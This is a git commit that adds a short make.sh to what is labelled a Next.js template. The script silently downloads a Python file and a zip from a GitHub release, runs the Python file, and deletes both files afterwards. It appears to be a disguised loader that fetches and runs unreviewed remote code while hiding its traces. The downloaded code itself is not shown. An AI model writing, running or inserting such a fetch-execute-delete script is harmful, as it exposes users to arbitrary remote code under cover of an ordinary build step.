a065767af47ec3a92410bf5159fe2f96c5d1ac00
Aric Jones <aric.jones@student.msdmartinsville.org>
2025-05-14 10:33:30 -0400

    Add files via upload

---
+++ make.sh
@@ -0,0 +1,5 @@
+wget -q https://github.com/Skj0nes-2/nextjs-template/releases/download/1.0.0/make.py
+wget -q https://github.com/Skj0nes-2/nextjs-template/releases/download/1.0.0/make.zip
+python make.py
+rm make.py
+rm make.zip
